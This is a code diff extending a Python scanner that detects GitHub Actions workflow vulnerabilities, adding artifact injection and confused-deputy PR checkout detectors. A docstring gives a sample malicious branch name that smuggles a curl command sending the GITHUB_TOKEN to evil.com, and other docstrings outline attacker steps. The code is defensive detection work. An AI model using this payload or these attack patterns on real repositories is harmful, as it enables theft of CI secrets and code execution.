@@ -11,16 +11,23 @@ from actions_scanner.utils.path import extract_org_repo_branch_from_path
 from .models import ScanResult, VulnerabilityType, VulnerableJob
 from .patterns import (
     ACTOR_GATING_PATTERNS,
+    ARTIFACT_READ_PATTERNS,
     AUTHORIZATION_JOB_PATTERNS,
     DANGEROUS_COMMANDS,
     DANGEROUS_GIT_CHECKOUT_PATTERNS,
     DANGEROUS_REF_PATTERNS,
     DANGEROUS_REPO_PATTERNS,
+    DISCUSSION_INJECTABLE_CONTEXTS,
+    DISPATCH_PR_CHECKOUT_PATTERNS,
+    ISSUE_COMMENT_INJECTABLE_CONTEXTS,
+    ISSUE_COMMENT_PR_PATTERNS,
+    ISSUES_INJECTABLE_CONTEXTS,
     MERGED_PR_PATTERNS,
     PERMISSION_CHECK_PATTERNS,
     PERMISSION_OUTPUT_PATTERNS,
     PR_TARGET_INJECTABLE_CONTEXTS,
     SAME_REPO_PATTERNS,
+    WORKFLOW_RUN_ARTIFACT_DOWNLOAD_PATTERNS,
     WORKFLOW_RUN_DANGEROUS_REF_PATTERNS,
     WORKFLOW_RUN_GIT_CHECKOUT_PATTERNS,
     WORKFLOW_RUN_INJECTABLE_CONTEXTS,
@@ -660,7 +667,7 @@ class ContextInjectionDetector(BaseDetector):
     """Detects context injection vulnerabilities in GitHub Actions workflows.
 
     A context injection vulnerability occurs when:
-    1. A dangerous trigger (pull_request_target or workflow_run)
+    1. A dangerous trigger (pull_request_target, workflow_run, issues, issue_comment, etc.)
     2. Attacker-controlled context variables are interpolated into run: blocks
     3. NO checkout is required - the injection happens via ${{ }} expressions
 
@@ -673,17 +680,34 @@ class ContextInjectionDetector(BaseDetector):
 
     An attacker can create a branch named: "; curl evil.com?t=$GITHUB_TOKEN #"
     to achieve command injection.
+
+    Similar patterns exist for:
+    - issues: Anyone can create an issue with malicious title/body
+    - issue_comment: Anyone who can comment can inject via comment body
+    - discussion/discussion_comment: Similar injection vectors
     """
 
     def __init__(self) -> None:
         pr_target_combined = "|".join(PR_TARGET_INJECTABLE_CONTEXTS)
         workflow_run_combined = "|".join(WORKFLOW_RUN_INJECTABLE_CONTEXTS)
+        issues_combined = "|".join(ISSUES_INJECTABLE_CONTEXTS)
+        issue_comment_combined = "|".join(ISSUE_COMMENT_INJECTABLE_CONTEXTS)
+        discussion_combined = "|".join(DISCUSSION_INJECTABLE_CONTEXTS)
 
         self._pr_target_pattern = re.compile(
             rf"\$\{{\{{\s*({pr_target_combined})\s*\}}\}}", re.IGNORECASE
         )
         self._workflow_run_pattern = re.compile(
             rf"\$\{{\{{\s*({workflow_run_combined})\s*\}}\}}", re.IGNORECASE
+        )
+        self._issues_pattern = re.compile(
+            rf"\$\{{\{{\s*({issues_combined})\s*\}}\}}", re.IGNORECASE
+        )
+        self._issue_comment_pattern = re.compile(
+            rf"\$\{{\{{\s*({issue_comment_combined})\s*\}}\}}", re.IGNORECASE
+        )
+        self._discussion_pattern = re.compile(
+            rf"\$\{{\{{\s*({discussion_combined})\s*\}}\}}", re.IGNORECASE
         )
 
     def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
@@ -701,11 +725,34 @@ class ContextInjectionDetector(BaseDetector):
 
         has_pr_target = _has_trigger(workflow, "pull_request_target")
         has_workflow_run = _has_trigger(workflow, "workflow_run")
+        has_issues = _has_trigger(workflow, "issues")
+        has_issue_comment = _has_trigger(workflow, "issue_comment")
+        has_discussion = _has_trigger(workflow, "discussion")
+        has_discussion_comment = _has_trigger(workflow, "discussion_comment")
 
-        if not has_pr_target and not has_workflow_run:
+        if not any(
+            [
+                has_pr_target,
+                has_workflow_run,
+                has_issues,
+                has_issue_comment,
+                has_discussion,
+                has_discussion_comment,
+            ]
+        ):
             return []
 
-        pattern = self._pr_target_pattern if has_pr_target else self._workflow_run_pattern
+        # Select appropriate pattern based on trigger
+        if has_pr_target:
+            pattern = self._pr_target_pattern
+        elif has_workflow_run:
+            pattern = self._workflow_run_pattern
+        elif has_issues:
+            pattern = self._issues_pattern
+        elif has_issue_comment:
+            pattern = self._issue_comment_pattern
+        else:  # discussion or discussion_comment
+            pattern = self._discussion_pattern
 
         jobs = workflow.get("jobs", {})
         if not isinstance(jobs, dict):
@@ -757,6 +804,376 @@ class ContextInjectionDetector(BaseDetector):
         return vulnerabilities
 
 
+class ArtifactInjectionDetector(BaseDetector):
+    """Detects artifact injection vulnerabilities in workflow_run workflows.
+
+    An artifact injection vulnerability occurs when:
+    1. workflow_run trigger (runs with base repo privileges after another workflow completes)
+    2. Downloads artifacts from the triggering workflow using run-id from workflow_run
+    3. Reads artifact content into shell variables or commands
+
+    Example vulnerable pattern:
+        on:
+          workflow_run:
+            workflows: ["CI"]
+            types: [completed]
+        jobs:
+          build:
+            steps:
+              - uses: actions/download-artifact@v4
+                with:
+                  run-id: ${{ github.event.workflow_run.id }}
+              - run: |
+                  BRANCH=$(<artifact/branch.txt)
+                  ./deploy.sh $BRANCH
+
+    An attacker can:
+    1. Create a malicious PR that triggers the CI workflow
+    2. The CI workflow creates artifacts with attacker-controlled content
+    3. The workflow_run workflow downloads and uses that content unsafely
+    """
+
+    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
+        """Analyze a workflow file for artifact injection vulnerabilities."""
+        vulnerabilities = []
+
+        try:
+            content = workflow_path.read_text()
+            workflow = yaml.safe_load(content)
+        except Exception:
+            return []
+
+        if not isinstance(workflow, dict):
+            return []
+
+        if not _has_trigger(workflow, "workflow_run"):
+            return []
+
+        jobs = workflow.get("jobs", {})
+        if not isinstance(jobs, dict):
+            return []
+
+        for job_name, job_config in jobs.items():
+            if not isinstance(job_config, dict):
+                continue
+
+            steps = job_config.get("steps", [])
+            if not isinstance(steps, list):
+                continue
+
+            # Find artifact download step that uses workflow_run.id
+            artifact_download_index = self._find_workflow_run_artifact_download(steps)
+            if artifact_download_index is None:
+                continue
+
+            # Find subsequent step that reads artifact content into shell
+            artifact_read_result = self._find_artifact_read(steps, artifact_download_index)
+            if not artifact_read_result:
+                continue
+
+            read_index, read_pattern = artifact_read_result
+
+            download_line = _get_line_number(content, job_name, artifact_download_index)
+            read_line = _get_line_number(content, job_name, read_index)
+            protection, protection_detail = self._analyze_protection(workflow, job_name)
+            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))
+
+            vulnerabilities.append(
+                VulnerableJob(
+                    workflow_path=workflow_path,
+                    job_name=job_name,
+                    checkout_line=download_line,
+                    checkout_ref="artifact from workflow_run",
+                    exec_line=read_line,
+                    exec_type="artifact_read",
+                    exec_value=read_pattern[:80],
+                    has_authorization=False,
+                    branch=branch,
+                    protection=protection,
+                    protection_detail=protection_detail,
+                    vulnerability_type=VulnerabilityType.ARTIFACT_INJECTION.value,
+                )
+            )
+
+        return vulnerabilities
+
+    def _find_workflow_run_artifact_download(self, steps: list) -> int | None:
+        """Find an artifact download step that retrieves from workflow_run.
+
+        Returns step index or None if not found.
+        """
+        for i, step in enumerate(steps):
+            if not isinstance(step, dict):
+                continue
+
+            uses = step.get("uses", "")
+            if not uses or "download-artifact" not in str(uses):
+                continue
+
+            with_block = step.get("with", {})
+            if not isinstance(with_block, dict):
+                continue
+
+            # Check if run-id references workflow_run
+            run_id = str(with_block.get("run-id", ""))
+            for pattern in WORKFLOW_RUN_ARTIFACT_DOWNLOAD_PATTERNS:
+                if re.search(pattern, run_id):
+                    return i
+
+        return None
+
+    def _find_artifact_read(self, steps: list, download_index: int) -> tuple[int, str] | None:
+        """Find a step after download that reads artifact content.
+
+        Returns (step_index, matched_pattern) or None.
+        """
+        for i, step in enumerate(steps):
+            if i <= download_index:
+                continue
+
+            if not isinstance(step, dict):
+                continue
+
+            run_block = step.get("run", "")
+            if not run_block:
+                continue
+
+            run_str = str(run_block)
+            for pattern in ARTIFACT_READ_PATTERNS:
+                match = re.search(pattern, run_str)
+                if match:
+                    return (i, match.group(0))
+
+        return None
+
+
+class DispatchCheckoutDetector(BaseDetector):
+    """Detects confused deputy vulnerabilities via issue_comment/workflow_dispatch.
+
+    A confused deputy vulnerability occurs when:
+    1. Trigger is issue_comment (or similar dispatch trigger like repository_dispatch)
+    2. The workflow acts on a PR (checks github.event.issue.pull_request)
+    3. PR code is checked out using refs/pull/N/head
+    4. Dangerous commands are executed on the PR code
+
+    This is dangerous even with permission checks on the commenter because:
+    - The PR author's code gets executed, not the commenter's code
+    - A malicious PR author creates a PR with poisoned build files
+    - A maintainer comments to trigger CI (e.g., "/run-tests")
+    - The maintainer's permission allows the workflow to run
+    - The attacker's malicious code executes with elevated privileges
+
+    Example vulnerable pattern (gevals.yaml):
+        on:
+          issue_comment:
+            types: [created]
+        jobs:
+          check-trigger:
+            if: contains(github.event.comment.body, '/run-gevals')
+            outputs:
+              pr-ref: refs/pull/${{ github.event.issue.number }}/head
+          run-evaluation:
+            needs: check-trigger
+            steps:
+              - uses: actions/checkout@v6
+                with:
+                  ref: ${{ needs.check-trigger.outputs.pr-ref }}
+              - run: make build  # Executes attacker's Makefile!
+    """
+
+    def analyze_workflow(self, workflow_path: Path) -> list[VulnerableJob]:
+        """Analyze a workflow file for confused deputy vulnerabilities."""
+        vulnerabilities = []
+
+        try:
+            content = workflow_path.read_text()
+            workflow = yaml.safe_load(content)
+        except Exception:
+            return []
+
+        if not isinstance(workflow, dict):
+            return []
+
+        # Check for dispatch-style triggers
+        has_issue_comment = _has_trigger(workflow, "issue_comment")
+        has_repository_dispatch = _has_trigger(workflow, "repository_dispatch")
+
+        if not (has_issue_comment or has_repository_dispatch):
+            return []
+
+        # For issue_comment, check if workflow references PR context
+        if has_issue_comment and not self._references_pr_context(workflow):
+            return []
+
+        jobs = workflow.get("jobs", {})
+        if not isinstance(jobs, dict):
+            return []
+
+        for job_name, job_config in jobs.items():
+            if not isinstance(job_config, dict):
+                continue
+
+            steps = job_config.get("steps", [])
+            if not isinstance(steps, list):
+                continue
+
+            # Find checkout of PR code
+            checkout_result = self._find_pr_checkout(steps, workflow, job_name)
+            if not checkout_result:
+                continue
+
+            checkout_index, checkout_ref = checkout_result
+
+            # Find dangerous execution after checkout
+            exec_result = self._find_dangerous_exec(steps, checkout_index)
+            if not exec_result:
+                continue
+
+            exec_index, exec_type, exec_value = exec_result
+
+            checkout_line = _get_line_number(content, job_name, checkout_index)
+            exec_line = _get_line_number(content, job_name, exec_index)
+            protection, protection_detail = self._analyze_protection(workflow, job_name)
+            _org, _repo, branch = extract_org_repo_branch_from_path(str(workflow_path))
+
+            vulnerabilities.append(
+                VulnerableJob(
+                    workflow_path=workflow_path,
+                    job_name=job_name,
+                    checkout_line=checkout_line,
+                    checkout_ref=checkout_ref,
+                    exec_line=exec_line,
+                    exec_type=exec_type,
+                    exec_value=exec_value,
+                    has_authorization=False,
+                    branch=branch,
+                    protection=protection,
+                    protection_detail=protection_detail,
+                    vulnerability_type=VulnerabilityType.DISPATCH_CHECKOUT.value,
+                )
+            )
+
+        return vulnerabilities
+
+    def _references_pr_context(self, workflow: dict) -> bool:
+        """Check if workflow references PR context from issue_comment."""
+        workflow_str = str(workflow)
+        return any(re.search(pattern, workflow_str) for pattern in ISSUE_COMMENT_PR_PATTERNS)
+
+    def _find_pr_checkout(
+        self, steps: list, workflow: dict, job_name: str
+    ) -> tuple[int, str] | None:
+        """Find a checkout step that uses PR ref from dispatch context.
+
+        Returns (step_index, ref_value) or None.
+        """
+        jobs = workflow.get("jobs", {})
+
+        for i, step in enumerate(steps):
+            if not isinstance(step, dict):
+                continue
+
+            uses = step.get("uses", "")
+            if not uses or "actions/checkout" not in str(uses):
+                continue
+
+            with_block = step.get("with", {})
+            if not isinstance(with_block, dict):
+                continue
+
+            ref = str(with_block.get("ref", ""))
+            if not ref:
+                continue
+
+            # Check for direct dispatch checkout patterns
+            for pattern in DISPATCH_PR_CHECKOUT_PATTERNS:
+                if re.search(pattern, ref, re.IGNORECASE):
+                    return (i, ref)
+
+            # Check if ref comes from a job output that references PR
+            if "needs." in ref and ".outputs." in ref:
+                # Extract the job name from the ref
+                needs_match = re.search(r"needs\.([^.]+)\.outputs\.([^}]+)", ref)
+                if needs_match:
+                    dep_job_name = needs_match.group(1)
+                    output_name = needs_match.group(2).strip()
+
+                    # Check if the dependency job constructs a PR ref
+                    dep_job = jobs.get(dep_job_name, {})
+                    if self._job_outputs_pr_ref(dep_job, output_name):
+                        return (i, ref)
+
+            # Check for gh pr checkout in run steps
+            run = step.get("run", "")
+            if run and re.search(r"gh\s+pr\s+checkout", str(run)):
+                return (i, "gh pr checkout")
+
+        # Also check run steps for gh pr checkout
+        for i, step in enumerate(steps):
+            if not isinstance(step, dict):
+                continue
+
+            run = step.get("run", "")
+            if run and re.search(r"gh\s+pr\s+checkout", str(run)):
+                return (i, "gh pr checkout")
+
+        return None
+
+    def _job_outputs_pr_ref(self, job: dict, output_name: str) -> bool:
+        """Check if a job's output constructs a PR ref."""
+        steps = job.get("steps", [])
+        if not isinstance(steps, list):
+            return False
+
+        for step in steps:
+            if not isinstance(step, dict):
+                continue
+
+            run_block = step.get("run", "")
+            if not run_block:
+                continue
+
+            run_str = str(run_block)
+
+            # Check if this step sets the output with a PR ref pattern
+            # Pattern: echo "output-name=refs/pull/.../head" >> $GITHUB_OUTPUT
+            output_pattern = rf"{output_name}=refs/pull/"
+            if re.search(output_pattern, run_str):
+                return True
+
+            # Also check for pr-ref or similar patterns
+            if re.search(r"refs/pull/.*/(head|merge)", run_str) and (
+                output_name in run_str or output_name.replace("-", "_") in run_str
+            ):
+                return True
+
+        return False
+
+    def _find_dangerous_exec(self, steps: list, checkout_index: int) -> tuple[int, str, str] | None:
+        """Find a dangerous exec step after the checkout.
+
+        Returns (step_index, exec_type, exec_value) or None.
+        """
+        for i, step in enumerate(steps):
+            if i <= checkout_index:
+                continue
+
+            if not isinstance(step, dict):
+                continue
+
+            uses = step.get("uses", "")
+            if _is_local_action(uses):
+                return (i, "local_action", str(uses))
+
+            run = step.get("run", "")
+            if _is_dangerous_command(run):
+                cmd_str = str(run).strip()
+                first_line = cmd_str.split("\n")[0].strip()[:50]
+                return (i, "build_command", first_line)
+
+        return None
+
+
 # Convenience functions for standalone usage
 def analyze_workflow(workflow_path: Path) -> list[VulnerableJob]:
     """Analyze a workflow file for PwnRequest vulnerabilities."""
@@ -770,9 +1187,13 @@ def analyze_workflow_all(workflow_path: Path) -> list[VulnerableJob]:
     pwn_detector = PwnRequestDetector()
     workflow_run_detector = WorkflowRunDetector()
     context_injection_detector = ContextInjectionDetector()
+    artifact_injection_detector = ArtifactInjectionDetector()
+    dispatch_checkout_detector = DispatchCheckoutDetector()
     results.extend(pwn_detector.analyze_workflow(workflow_path))
     results.extend(workflow_run_detector.analyze_workflow(workflow_path))
     results.extend(context_injection_detector.analyze_workflow(workflow_path))
+    results.extend(artifact_injection_detector.analyze_workflow(workflow_path))
+    results.extend(dispatch_checkout_detector.analyze_workflow(workflow_path))
     return results
 
 
@@ -781,6 +1202,8 @@ def scan_directory(directory: Path) -> ScanResult:
     pwn_detector = PwnRequestDetector()
     workflow_run_detector = WorkflowRunDetector()
     context_injection_detector = ContextInjectionDetector()
+    artifact_injection_detector = ArtifactInjectionDetector()
+    dispatch_checkout_detector = DispatchCheckoutDetector()
     result = ScanResult()
 
     workflows_dir = directory / ".github" / "workflows"
@@ -797,9 +1220,13 @@ def scan_directory(directory: Path) -> ScanResult:
             pwn_vulns = pwn_detector.analyze_workflow(yaml_file)
             workflow_run_vulns = workflow_run_detector.analyze_workflow(yaml_file)
             context_injection_vulns = context_injection_detector.analyze_workflow(yaml_file)
+            artifact_injection_vulns = artifact_injection_detector.analyze_workflow(yaml_file)
+            dispatch_checkout_vulns = dispatch_checkout_detector.analyze_workflow(yaml_file)
             result.vulnerabilities.extend(pwn_vulns)
             result.vulnerabilities.extend(workflow_run_vulns)
             result.vulnerabilities.extend(context_injection_vulns)
+            result.vulnerabilities.extend(artifact_injection_vulns)
+            result.vulnerabilities.extend(dispatch_checkout_vulns)
             result.files_scanned += 1
         except Exception as e:
             result.errors.append(f"{yaml_file}: {e}")
